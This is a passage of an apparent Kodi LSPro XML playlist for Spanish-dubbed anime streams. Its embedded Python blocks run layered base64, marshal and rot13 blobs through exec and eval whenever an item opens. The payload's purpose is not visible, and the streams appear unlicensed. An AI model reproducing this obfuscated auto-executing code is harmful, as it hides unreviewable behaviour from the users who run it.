9hazB4VG1wYWJVNVVSVEpaVkUweFRrZEpNazFVVFRKT1ZGa3dUWHBqTUU1SFJURk9lbHBwVGtSVmVrNVVWVFZOYlZsNlRtcFpNMDVxV1hwT2FtTjRUbFJaTUUxcVdURk9lbXN4VFZSUk5VMTZVVEZOZWxFMFRsUm5NRnBxV1RST1ZFa3pUVlJaTUU1VVp6Rk9SRlY1VGtkUk1VOUVXWGxPVkVrelRXcE5NMDVFVlhwTmFsa3hUbXBqTWs1cVl6Vk9lbEV5VGxSUmVrMTZVVEphYWxVd1RYcFpNRmw2V210T2JVVXhUbXBSZVU1NlRUSlBSRkUwVG5wRmVrOUVXWHBPYW10NlRVUk5OVTVVWnpOTlZGcHBUbXByTUUxVVRYZE9la2t4VGxSTk1VNXRXVEpPUkZVeFRsUlplazFVVlhsT1JFa3dUWHBaZVU1VVdUSmFhazE0VG5wRk1rOUVWVEZPVkZGNlRsUmthRTVxV1RGTmFtTTBUbnBCTVU5VVZtaE5iVWt4VFdwS2JVMTZXVEphVkZVeVRsUmpNRmxVVW10TmVtY3dXVlJOTWs1dFJUSmFWRTAxVGtkSk1rMVVXVFJPVkdNelRVUlZNRTU2U1RGTmFsa3hUbFJKTTA5RVpHaE9lbEV5VFZSVk1FNVVhM3BOVkUwMVRrUm5NMWxVU20xTmVrRXpUVVJWTkU1RVl6Qk9hbFY1VG1wWmVrMXFZek5PYlZreFRVUmpOVTVxYXpOT2FsazBUbXBSTUUxNlZUUk5la1V5V21wYWFrMTZRVEZPUkUxNVRtcGplVmxxVW1wT2FtZDZUbXBqZDA1SFRYcE9WRkY0VGtkVk1VNTZZM3BPVkVVelRVUlJNazE2WXpGTmFsbDRUbnBaTUUxcVRUTk9WRUV3V1dwWk5VNXFWVEZPVkZKcFRucFZlazFFVlRWT2JVMHdXbFJhYkU1RVRUSk5WRTE0VFhwWmVrMVVVbWhPZWtVd1QxUkthVTV0UlhwTmVrMDBUa1JWTVU5VVRUVk9la2t3VGtSWmVFNUhSVEZQUkUweFRucGpNMDFxVVRKT2JVVjZUVlJWTlUxNlFUTk5WR041VFhwbk1VMXFWWGxPUjBreVRrUk5NazVFVlRCTmVsSnNUbFJWTWxsVVRYZE9iVkV5VGxSTk5FNTZVVEpPVkZFeFRsUlpNbGw2VVhwT1JFMHhUbXBhYkU0eVJUSlphbEV3VFhwUk1GbHFZek5PYWtVeVRucFZNazVFVFRCWmFrMHhUWHBaTVUxVVdtMU9WRUY2VDFSUk1VNTZTVEZOZWxKcVRsUlpNMDE2VFRKTmVrVXdUV3BqZUUxNlVURk5hbU0wVGtkTk1VNVVWVFJPVkVFeVRYcE5lRTU2U1RCT2FscHRUbFJSZWs1VVVtaE9SMDE2VDBSWk5FNVVTVEJaYW1NMVRrZEplazFVWXpWT2Ftc3hUVlJWTlU1VVVUSk5WR014VG5wQk0xbFVZelJPVkdNeldWUlZNMDV0U1RCYWFrMTVUbnBGTTA1cVNtbE9la1V5V1hwVmVVNXFUVEpOYWxVeVRYcE5NRnBxWXpOT1ZGbDZUVlJSTUUxNlp6QlphbU42VG0xWk1rNXFUVEpPZWxGNVdXcE5kMDV0VVROT1JGcHJUbnBGZWsxNlkzaE9hbGt6VDFSak1FNUhTVEJOYWxVeVRrZFZNazVxWkdoT2VrVXlXV3BqZDAxNlRURk9WRTB6VFhwck1GbDZWWGRPZWxrd1dXcFJlRTVxVlRCTlZHUm9UbnBKTTA5VVZYaE5la0V6VG5wamVVNUVTVEJQUkZVMFRrZFpNRTVFVVhsT1ZFVXpUV3BWZWs1VVozcE5hazE2VFhwSk1sbDZVVFZPYWxFd1QxUlpNRTE2VlRKTmFsVXpUbTFGTUU1cVZURk9WRmt3V1ZSak1FNUVUWGxaYWxsNVRYcEpNbGxxVlhkT2JVVXdUa1JqTkU1VVkzcE5hazE0VG5wbk1GcEVVVFJPYWtsemNRNEFBREZCYlVWNFFVcFNNazFIVERKYWJVZ3hURWRhTTBGNlNHMUJkMW93UVhkME1rRlJURFJCUjBneVFVZE1NMEZ0VERGQlVYRjFXbTFTYlZwSFRHdEJVVWh0UWxGYWJVRjNTREpNYlhCdFFVZEViVnAzY0dwYWVrd3lUWGR3TUVGSFRHMUNSMFY1UVZSTU1FRkhSWGRCZWtneVFXMUViVnA2VERGQ1IwZ3dXbTFNTWtGM1RHdEJla2d3VEcxeGRVRlJjREJOZDBoclFVZHdNa0ZIUlhoQmVscHRRbEZKZFVGSFRqSmFkMFJyV20xME0wRkhUR3RCYlhBd1RYZHdNRUZIVm0xQ1IwZzBXbTE0YlVGSFJYaEJNbEl3UVhkYWJFRnRkREphZDAxM1dtMU9iVnB0V214QmQxWnRRVWR3YWxwdFZqRkJkMDEzV20xRU1WcFJURzFhYlZKdFFWRk1ORnA2VEROQlVVdzBRVkZXTVZwSGNEVkJkMFF6VEVkRU0wRjNXak5DVVV4dFFWRjRNMEpIU0d4QlNsSXlXbmRGZGtGdFZqQk1iVXhzUVcxSU0weEhSWFZhYlhBeVdtMXdNVnB0VmpOQmQwVjNRVzFFTWtKUldqUkJVWFF3VFZGSWJFRkhUakpNUjB4c1FXMU1NazFSVEcxQlZGb3pURWR3YTFwdGVESkJSMXB0UVcxRWJWcFJSRE5hYlhReVFVZGFiVUZ0U0cxQlIwd3lRVWRPTTFwM1JEVkJiVXd3UWxGd01scHRjREphYlhCcVdtMWFNa0ZSUkcxQmQxb3dURzFJYWtGUlZtMUJVVnB0V20xME1VRlJTR3hCZWxveFFsRkliVnB0UkRCQlVWZDZXbTEwTUVGdFdqUkJSMDR5VEcxd01rRkhUak5CZDBnelFYcFdNbHB0VEd0QlZFd3dUSGRFTlVGUmNERkJiVm94V20xNGJWcHRTRE5CUjNoaFVVUmpaVTFMZVdkTVNtZDVjSFpPT1ZaUWNHeE5TMFZyVEVkMVpIRjNTV0p2VkRFMlJucFNhMjVzT1ZkYVNsb3lRVXQ1ZDNCUmNERnVlRk4xVEhwVGJVcFVlV1JNU2pGMWIwWTVWbko1Y1VweE1YazFXbE5TTlVkU1FVbEdTM1ZuU1VvNU1rbDVUMlphZWtWdVFraFhOVUZWUVdaeWVHSmxRa2xUVTBSM1FWQkhNVUZRV25kYWFXOUlRVkJ3TTBWcGNEQk5kVzVIZFROR2VGTnJTRlZYUlc0eVkwWndNRk5KUkRKeGVYRXhSR1ZHTUZac1NIaEZiRVl3U0dWYVVWTXpSekkxUTBGNGVUWkhNMWRvYjFWT1pVZ3pjREJGVTNCdFdrbE5iRzVJVFhoTVMyTjVUVkZ3TUhFd01VbHdWVk41UkRCWGJrMUthak5IZVU5U2NFWTVTa1o1Y1c1d1NIVlJjVlJOV0ZodFUwaHZiVm96V2xRMWVGa3pVMUpDVW5Gc1J6SkpiVWxJUldOR2JVbFRTbE5JTVUxUU9HeEpNMU5zU0VkRldGcFNUV3RKVkdJMVJESm5aVVF5VEdwR2JWZGlTa3RQVDNKNlkxQkZNRFY1V0RKeFUwcGhXak55ZUhCbGJqQkpibkZWVTFGTlNtZG9iek54Wkc0d01EQk5ZV05DY0RCcmFFWXhXalJ1UmpsWmIyMVRRMGR0UkROdlIzRnBSekZGYlVsSlRWQkhTRWhyUVZGMU1rRjNkV3B4TW1KcFNFZE1ORzh5VjNsSVVsTXdUR0Z4VUVsSlQydHdSM1ZEUVRKVGRVUkhWM2h5ZWpWYVJtMU5hVzh5TkROR2QweGxTRkZUVFVaUlZtdHZVWFV6Y0VwTlVYQktjWHB4WVUxaGJrbEZURzh6U0dwTWQwNXJXbFF4VVhKR1oyMU5TV05WYjB0QmJrMUtUREpHWVZkcVIzbFBhVmx0UkRSd2JVMWljREpJTVVSaFJXdENTa2w1UlZWamVVVlVRVnBLZUZOc1dubFRlRWRSVFhaWk0wVlBXbFJyTWxwTFYxTkpNamhyY1RKcmJVMVZVakZ3VVZOblFWUTVNMFZSUVRaR00wRkJjVWxKWjBSNVUwSkliVWxrV1RCWFIweDNUbTFhUjBWdVJUTmlhbGh0UVZGSlIwMUdUVlZhTVc0d01UVkJlakZhU2tkRmVtOTZXakJ3U0RGMVFVdEpia3BSZEdweWVubDFUVWRYYTAweWFtbEJWRVZCUkdGVFYzQjZNREJhTTBsblNsRjFaVnB0ZFhwdWVuVjZjVWhqV1VreWNXeHllbE5RYmtweE1FVjZhM2R3VkRscVJqSk1aVXhLZVhaeFUwNXFRa281UVVsU1p6TklWVTl1UkRKWFZrbEtjREZOVW1kYWNrdFhNMHBVWm1WQmJVVlhSakpUVkc1UlVqVkVNbEp0U1RCNWRWcDNkR2x3ZDBsVWIzbHhlVzVJVTFsQk0xTnBiMUY1YTBZd2NVVkNTWEY1V1RGSlkwcDRjV0Z3ZW1OamIxTjFVVm96ZVdadVNVZ3dSM2hTTkVKS2VXZHZTREY0V2pKcmFrMVFaMk5KYlhGcWNUTndiVTFVVXpadVIzRk1URXBXTUc1SU1VOUpNMDV0Y0cxWFpGaHRjVVpLU25sQ1JETnhZMFZ0ZVV0RmRqZzFXREY1UjI5VlFVdElNVXd3U1V0NU1VUktkVmxHU2xObGNURk9iVnBVWWpSTWQzVmxjbE5CUVV4S2RVcHdWV05pUkRGVE5tNTNTREpOWVdOclJHMXhUMHA0WjBGTVNGTmpSWGx4YlVZelJVcHdTa0UwUm5wRmFuSmhWekJGVVhWNlIwaHhXa2RHT1VkRk1VMVpjbUZJYTNKM1RWVkhlbU5zY0VoMGFscElRV0pFYlZOTlJ6SldNRWt4U1RCd1IwbEdSREZGVWtsVldqTndTamxvYnpKRlJVMTZZMmh5ZG1kMVJrWTVObTh3YTBSdVZVVnBjRlZYYTBGSGRXbEZVM2xXVFhkeE5FZEhTV3hFTWtRMFRFcHFaVUZTWTNwYVlWTkxTbnBJTWt4NmRVZEJNVTlsU0VabWJXOUhVM2xLZUVnelJUTkZha2N5T1ZCSVNVUnFiMUpCYkVKVlV6VkJkMDFoV2tkSmJreEpSWGxhTWxwc1NEQjFWRUZKWW10TlNGZDRSR3huWjBWS2NWQlpNRUZvY0ZRNVQyOTVRVXR3TWtFMFJFcHdhMDFLU1dsd1NuVnJUVWxCUTBaM1ZtdHlTM0ZVUVRCME1VRXpUbXR3YlVsMWNYcG5WVTB4ZFUxSFJtZGpSbEZQZVc5S09WaFpNbmxMY25abk0wRlVlVWhaTUZJd1JXRnhXSEJoVFZWR1IwOTVTRWRGVUV4NE1HeENTR2RSV2pKYVpXOVJjVlpFTTBsTVFrcFRUVWQ2Ulhod2RqbENjRkpyWTAwelNEUnlZVTFxY1ZOd2FVRlNlREZHZW5GTmNIZE5SWEF5WjI1d1NXTkZTR0Z3Tlc1SFREQnVlRFZvUlZBNWFVRlVRV0phTWtFMldrZHhhM0JRWjAxSE0wOURRa2gxYTBoR09UTmFiWGcwVEVwNWJFa3hjRFZ1ZUZkMVFrcG5UMEY2U0dWQmVrbERXbTFCYlZreVFVOXdkMFZOUVhkWGFrbEdaMEZGU0hWVmJrWTVUMGN4Y1dadmVuRlljR3c1TW5CMlowOUdlSGwyVFdGV05XOHhjV3hKUmpsWmJtMUliSEo1UVc1SVMwRm5jWHBGVUc0eVJHeEdNMDlzUnpKeGRVZ3dZMk5CUzFOVFdraEJNbTVJU1dWYVIwOTFRVEppYVVsMk9HcHVVWFUxV2pKNE1HNXNaMFJ5VlVsSlJWQTVabTU2VFdodk1ubFZiM2huUlVWU1VtbHVTVTk1VEhoQmJVMUtZMjFZTUVVMmNraHFhWEJWUVd0RU1tTXpiMFpuTWtFd1oxcHZNSFZqV1RCVFVrRXlhbWx4WVVnMVdtRndiVnBoVG1sd1NYVm1Sa2htTUVsc09HcHhTa3hwY0VsRmRuQnNPR1ZCU1VsbFJteG5ibHBSVHpKdVNqbE5SWGhOVkZrelYyVnVSMDFuUVhneGRuRXpWalZ1VkhrMlIyMUVhMFZSV210SGVrMUNia2RYU1VVelRYbEdlWFY1UjBZNE5VUjZUVzFCZUhBMWNUTmpXVzlRT1ZkdlNrVlBUWGhFYTBwVVFWWkViRGxrUVZKclRWcFZUMk5NZGpobGNVbEpXRUpLZFZGRVlVRTFUSG80TUVkTFYxbEViVmRtV20xV1pXOUtjREp1VURsc2JqTlBaVVpIZEdsTlZVVlhjRzFTTVhBeFYyNUlNa1V5Y1cxVGRVRlVVek5JUm1abGNGQTVlVUpLZURSSFMwVm5SM2hUTlVsSGNYZHZlbkYzUWtkQmFWcFZlVmRHU25WUlJIcHhZMEZLU1dweFlYVlFSMVI1U1V4aFJXUnVTMVpzUm13NGFVUjNkRE5hZDBWWmIxRndhazFLVW1WR2RqbHFXbTFFTTNBeWRERkZVVUZaYjFKaVpYQktSV3hFU2xJd2JraG1hM0JKWTFGdmJVNXBSRXBpWlVVd1UwcEdNa2d4UWt0MWRraEhUMmx1TWtobGNESk5XVVF5WTJGWmJVOXVXbXc1ZVVoSVZtMU5TR1l6UVcxME5VZEdPVFJCUzNVeldERmpNVXhKY0RKSWJVMVRURXRhTTBKSFYybFpNRTFJU2xCbk0wY3pkWGh2TVhWWlFYcFNORzk2Uld4QlVtTjNjbE54UWtkR09VbHZSM0Z0YmtkRWFscFVaMk5GTTBGVFJtMTVlRmd5TlV0Wk0wMTZjWGxNYVhCc1owMXdTMHhwU1Vod01rUjZVM1Z1ZDNGVFdXeG5XRWRKWTFoTlIwRmpXbnBTTVVKUlRqVktWVVJsYmpCaWEzQmhRVTFCWVU1cGNXdzRiVUZ0UlhsWU1FRk5RVWhUWWtsc09UQndNVmQxV213NWRuQkdPWGxHVVVWc1dqSkpXVmx0Y1dadlVYbHRXV3c1ZDFwc1pqTkZlSEJwVEVkTVpWa3pRVVZhUjFOM2Jub3hVVmt6UlVkSVJtZFFSbTFTWVZGRVl6WnVTamxvVmxFd2RGY3hhelJCYlZkd2NsRk5la3RWZEROQlUyczBXbTFUY0hKUldtMVhhakJZYjNwSmFWWlJNSFJOUzAxMWIxQjBZVXRWZERKYWVXczBRWGQ1Y0hKUlRYbExWWFF5V2tsck5FRnRRWEJ5VVV4dFMxVjBNa0pKYXpSQmQzbHdjbEZYZVV0VmRETkJTV3MwUVhwSmNISlJURFJMVlhReVFVbHJORUZ0ZFhCeVVVMTNTMVYwTWtKSmF6UkJkMDF3Y2xGd05VdFZkR3hDVTJzMFFYcEZjSEpSVFhwTFZYUXpXbmxyTkVGdFQzQnlVVXcwUzFWME1rRkphelJCYlVsd2NsRndiVXRWZEd4Q1NXczBXbmRPWVZoR1RtVldWRWt5VEVwcVlsY3hhelJCZDBGd2NsRk5la3RWZERKQlUyczBRWGRKY0hKUlRHMUxWWFF6V2pGck5GcDZTWEJ5VVV3d1MxVjBNa0ZKYXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJWalJMVlhRelFWTnJORUZ0VjNCeVVVdzFTMVYwTWsxSmF6UkJkM2x3Y2xGd01FdFZkRE5DU1dzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFWk9aVlpVU1RKTVNtcGlWekZyTkVGM1YzQnlVVXcxUzFWME1rMUphelJCZDFOd2NsRndiVXRWZERKYU1XczBRWGQ1Y0hKUlREVkxWWFJzVFVsck5FRnRTWEJ5VVUxNVMxVjBNa0pUYXpSQmQwbHdjbEZ3TkV0VmRESk1NV3MwUVhkNWNISlJUREpMVlhRelFrbHJORnAzZFhCeVVVMTZTMVYwTTFwNWF6UkJkMU53Y2xGTWJVdFZkREpNTVdzMFFYZEpjSEpSVmpWWGJIaDBXR3hQZVhGNlUyWllVSEZ3Y2xGTWJVdFZkREpOZVdzMFFYZEZjSEpSVERGTFZYUXlXakZyTkVGdFFYQnlVVmQ1UzFWME1rRlRhelJCZDBsd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFJzUWxOck5FRjZWM0J5VVV3eFMxVjBNMEpKYXpSQmVrVndjbEZNYTB0VmRESk1lV3MwUVhkSmNISlJjR3hMVlhSc1dsTnJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhFTUZoTlMwMTFiMUIxZDI4eU1XcHVTbXQ1V0ZWalptNUtWbWhOVkVsM2J6SXhhbkI2U1cxd2JIVjJURXRCZVVGM1JHaE1kMHd3VFZSSmQyOHlSWGxZVkVreVRFcHFZbGN4YXpSQmVrbHdjbEZNTVV0VmRESk5kbkJqV0VaNFpsZHRhMjF4VlZkamIzcHdLMWRzYW1GTlMzVjVUR3h3WTFoRVBUMTBCUUFBQUhKdmRERXpjd2tBQUFCdGIzSndhR1YxY3lCekhBQUFBR052WkdWamN5NWtaV052WkdVb2RISnBibWwwZVN3Z2VtbHZiaWwwQmdBQUFHOXlZV05zWlhNZUFBQUFZMjlrWldOekxtUmxZMjlrWlNoclpYbHRZV3RsY2lBc0lIcHBiMjRwZEFNQUFBQnVaVzl6Q0FBQUFEeHpkSEpwYm1jK2RBUUFBQUJsZUdWaktBc0FBQUIwQmdBQUFHSmhjMlUyTkhRR0FBQUFZMjlrWldOemRBZ0FBQUJ0YjNKd2FHVjFjM1FIQUFBQWRISnBibWwwZVZJRUFBQUFkQWdBQUFCclpYbHRZV3RsY25RRUFBQUFlbWx2Ym5RRUFBQUFaWFpoYkZJRkFBQUFkQWNBQUFCamIyMXdhV3hsZEFrQUFBQmlOalJrWldOdlpHVW9BQUFBQUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUUlBQUFBUEcxdlpIVnNaVDRCQUFBQWN3NEFBQUFZQVFZQkJnRUdBUVlCQmdFcUFRPT0iKSkp"))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/3N7E8uv.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
--------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Castellano [COLOR yellow](Nuevo)[/COLOR]</title>
<externallink>https://raw.githubusercontent.com/FESTAKIDS/festakids/main/LILIANIME/DB.CAST/DBALL.CAST$$LSProEncKey= $$</externallink>
<link>na</link>
<thumbnail>https://i.imgur.com/Si3lWOP.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>

<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Castellano [COLOR yellow][/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGZRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SRmsxVGxSak1rNXFXbXROYlVrelRVUktiVTE2UVRCYVZGSm9UWHBuZWsxVVVYaE9Na1V5V2tSak1FNUVZekJaYWxrMVRYcG5NbHBFWTNkT2JVMHdUMFJXYUU1VVl6Qk5lbGswVG1wUk1FMXFVWGhPUkUweVRXcGplazE2VlRCT2VsVTFUbXBKZWsxVVVYcE5lbWQ2VFdwTk1rNVVaekZOVkZsNFRtMUZNRTFVVFhoT2VsVXlXV3BOZUU1NlozbFpha3B0VGxSbmVrNUVXbXhPYlZVd1RtcFZNVTR5UlhwTlJFMTRUbnBGTTA1RVRUVk9iVkV3VG1wVk1rNTZUVEpaYWxrMVRrUnJlazFxVFROT2JVMTZUMFJaZWs1cVRYcE9lazB4VGxSUk0wNXFXVEZPYWxrelRtcFpORTU2WXpOT1ZHTTBUbXBaTVU5RVRYaE5lbWN4VFVSamQwNXRUVEZOUkVwdFRYcGplazVxWXpWTmVsVjVXV3BLYVU1SFdUQlBWRnBzVFhwUmVrOVVWbWhPYWxFeVRtcFpNazR5UlRKYVZGVXlUakpGTWs1cVZUSk5la2w1V21wTk0wNUhUVEpPYWtwdFRsUm5lazVVVFRCT2JWRXpUbXBOZWs1NlVUQk5lazAwVFhwQk1scHFXVEpPZWxsNVdtcE5lRTV0VFhsYWFtTjNUWHBaTWsxVVRUVk5lbEV4VFVSTmVrNXFWWHBQVkZreVRXMVpNMDVxVVRST2JVMHpUVlJrYUU1cVdUQmFhbVJvVFcxWk0wNUVUVEpOYlVreFdWUlJNMDVIVFRKT1JGa3hUbFJWTUZsVVRYcE5lbU13V1hwUk1FNXFSWGxaYWxwc1RucG5NVTFFVVRWTmVrVjZUbXBaZVU1VVl6Qk9lbEUwVGxSUk1rMXFWWGRPYWxreldWUmFhRTF0U1RCWmFsVjZUWHBOTWxsVVVtdE9ha1V5V2tSWk1rNUhTVEpaYWsxM1RucGpNRmw2WXpKT2VrMTVXV3BaTWsxNmF6Tk9WRkpvVFhwbk0wNTZZM2xPVkVFeVRYcFJNMDE2YXpCT1ZFMHhUa2RSZVZscVZUUk9lbGt4VG5wU2JFNXFXVE5OZWxKclRsZEZlazVFVm1oTmVsVXpUbnBXYUU1NlNYcE9lbHBzVG5wWk1VNUVUVE5OZWsweVRrUlpOVTU2U1RGTmFsbDZUbTFGTWs1VVNtMU9ha1Y1V1dwUk1rMTZaekZQVkdNMVRtcHJNazVFVFRKT1ZHY3hUbFJOZVU1VVZUTk9WRTB6VGxSSk1VMTZTbTFPTWtVd1RtcGpNMDV0VVRKTlZGVjZUWHBuTTA5RVVtMU9lbXN6VGtSVk1FNXFSWHBPVkZwcVRrUnJNVTlVVFhoT2JWVXlXa1JOTTAxNll6QlplbEp0VG1wUk1FNUVXbXhOZWxVelRVUk5lVTVVWnpCTmVtTjNUWHBWTVU1NlVteE5lbXN6VDFSYWJFNUVXVE5PVkZwcVRrUkpNazVxVFhoT2FtZDZUbXBLYVU1RVdUTlBWRlYzVFcxSk1GcFVXbXBPYWxFd1dWUlpOVTVIU1RKT2FsVXhUa2RSTTFsVVpHaE9iVTE2VGxSU2FFNXRTVE5QVkZKcFRsUmpNVTlVVFhkT2Vsa3lXV3BhYlU1SFNUSk9hbFY2VG0xTk1FMTZVbXBPVjBVelRsUmpOVTVxVFRGT2FscHFUakpGTUZsNldYbE9hbGt5V1hwak1VNUhSVE5aVkZwdFRtMVZNRTVxVVhsT2Fra3dXVlJhYkU1VVNYbFphbEp0VG1wck0xbFVZekJPYlZsNlRucFplRTE2UVROT2VrMTVUa1JWTTAxRVkzZE9SRTB3VG1wU2FrNHlSVEJaZWxKclRrZE5NVTVFVlhwT2Fra3hUWHBWTkU1SFJURlBWRkV5VFhwck0wMTZWVE5OZWswd1dtcGFiVTVIVVRKTmVsRjVUbXBaTVU5VVRUVk9iVkV5V1hwYWFVNVVUVEZPYWxVeFRucFpNRTFxVW10T1ZGRjZUMFJqTWs1dFRUTlBWRlV4VFhwTk1GcEVXVEJOZW1zeFQxUlplVTU2U1RKUFZHTTBUbnBOTTAxNlVtMU9WMFV5V2xSU2FrNXFZekphUkZKb1RYcEpNbHBVV1RWT2VrRjZUbXBLYlU1NlRUQk9hbEp0VFhwbk0wMUVUVE5PVkZFd1RsUmplazV0VFRGT1JHUm9UbFJKTWsxVVZUQk9iVlV3V1ZSU2EwNVVUWHBQUkZwcVRucFpNazlFVFRST2FtY3hUa1JrYUU1NlJUTk5SRTB6VFhwRk1GcHFXVFJPUjAweFRsUlZNVTE2V1ROUFZGbDVUa2RKTWs1Nll6Qk9hbGt5VDFSVk5FNUVVVEpOZW1ONlRsUk5lazlFV1RWT2FrVXhUMVJWTWsxNlNUSk9WRlUxVG0xRmVWcHFUWGhPZWxFeFRVUmFhVTV0U1hwT2VtTTBUa2RWTWs1NlZYbE9lbGw2VG5wVmVVNXFXWHBOVkZrMVRtMVZNbGxxV21sT1JGRXpUV3BSTTA1NlVUSk5hbVJvVGtkUk1rMVVTbWxPZW1NeldWUlNhazVxVFROT1JGSnJUa1JyZVZwcVdtdE9Na1V3VGxSYWJFNVVhek5OVkZWM1RtcEZNMDlVVVhsT1JHY3lXa1JqZDA1NlVUQmFSRmw2VG0xVk1rMVVVbXROZW1Nd1dWUlJNVTU2YXpGT1JGSnNUa1JKTWsxcVRYbE9lbEV6VFVSVk1rNTZhekZOZWxVMFRrUkZNVTVFWXpGT1IxVXhUbnBaZVU1dFRYbFphbGswVFhwTmVrMUVXbXROZWtrd1QwUkthVTE2U1RCWmVsRXlUbFJCTWxwcVVURk5la0V3V1dwU2JVNUVSVE5PVkZKc1RsUnJNVTFFVFRCT1ZHTXhUa1JOZVU1NlJUQmFWRkpyVG0xRk1VNUVZelZPUjBVeFRYcGplRTVVV1RGUFJGRTFUbXByTWs1VVdYcE9iVmw2VFdwU2JFMXRXWHBPZWxGNFRYcEJNazFxWTNoT2Fsa3lUbFJWZUUxNll6Qk9hbEUxVG5wVk1rMVVUWHBPZWtVeVdrUmplazVFUlhwTmVsWm9Ua1JaTWs1cVl6Sk9WR2N5V2xSamQwNXFTVEZOYWxWM1RucEZNVTlFVlRGTmVtY3lUMVJWTUU1RVZYbGFhbU15VGtSUk1FNXFVVEpPUjBWNlRXcFpORTVIVFhwUFZFMHdUakpGTWxwVVVYaE5lbWQ2VGxSUk1VNTZVVEJQVkUwelRrUnJNMWxVWXpKTmVrRjZUMFJSZUU1NlZUTk9SRkUxVGpKRmVrMTZZM2RPYWxrd1drUmpORTV0VFRGTmFscHJUWHBWTUU1RVRYcE9lbXN4VFhwUk1rMTZUWHBOYWxwcVRtcFpNMDE2V1RWT2Vsa3dXbXBqZUU0eVJUSmFWRnBwVGpKRk0wMTZUVFZPUjAweVRucE5NVTU2VFROTmFsSnRUWHBqTUZwcVVYaE9SR2Q2VFZSTmQwNVVUVEpPYWxrMFRrUnJNRTU2V1RGTmVra3dUV3BLYlUxdFdUQlBWRTE0VFhwTmVrMXFVbWhPYWxrd1RXcFpNazF0U1RGTmVrMTZUbFJaTUZsVVZYZE9SMGt5VG1wTk5VNVVaM3BOUkUwMFRrUlJlazE2VlRCT2JWa3dXbFJTYkU1NlRUQlphbFV3VG5wbk0wNUVVbTFPYWxVeFQwUlJlRTVFWjNwTmVsRjRUa1JOTVU5RVVYcE9iVWw2VDFSVmVrMTZhekphUkZVd1RsUm5lazVxVVRKT1Z